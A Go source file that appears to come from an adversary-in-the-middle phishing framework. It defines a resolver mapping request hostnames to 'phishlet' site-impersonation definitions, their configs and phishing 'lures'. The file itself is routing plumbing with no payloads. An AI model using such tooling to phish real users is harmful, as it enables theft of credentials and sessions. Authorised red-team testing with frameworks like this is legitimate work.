package aitm

import (
	"fmt"
	"sync"
)

// PhishletResolver maps request hostnames to their phishlet definition, config,
// and lure. Definitions are registered via RegisterDef when the phishlet watcher
// loads or reloads a YAML file. Configs and lures are queried from the store.
type PhishletResolver struct {
	mu        sync.RWMutex
	defs      map[string]*PhishletDef // phishlet name → compiled def
	cfgStore  PhishletStore
	lureStore LureStore
}

func NewPhishletResolver(cfgStore PhishletStore, lureStore LureStore) *PhishletResolver {
	return &PhishletResolver{
		defs:      make(map[string]*PhishletDef),
		cfgStore:  cfgStore,
		lureStore: lureStore,
	}
}

// RegisterDef registers a compiled phishlet definition. Called by the phishlet
// watcher when a YAML file is loaded or hot-reloaded.
func (r *PhishletResolver) RegisterDef(def *PhishletDef) {
	r.mu.Lock()
	r.defs[def.Name] = def
	r.mu.Unlock()
}

// ResolveHostname finds the phishlet definition, config, and best-matching lure
// for the given hostname. Returns an error if no enabled phishlet claims it.
func (r *PhishletResolver) ResolveHostname(hostname string) (*PhishletDef, *PhishletConfig, *Lure, error) {
	configs, err := r.cfgStore.ListPhishletConfigs()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("listing phishlet configs: %w", err)
	}

	r.mu.RLock()
	defer r.mu.RUnlock()

	for _, cfg := range configs {
		if !cfg.Enabled {
			continue
		}
		def, ok := r.defs[cfg.Name]
		if !ok {
			continue
		}
		if !def.MatchesHost(hostname, cfg.BaseDomain) {
			continue
		}
		lures, err := r.lureStore.ListLures()
		if err != nil {
			return nil, nil, nil, fmt.Errorf("listing lures: %w", err)
		}
		var matched *Lure
		for _, lure := range lures {
			if lure.Phishlet == cfg.Name {
				matched = lure
				break
			}
		}
		return def, cfg, matched, nil
	}
	return nil, nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
}
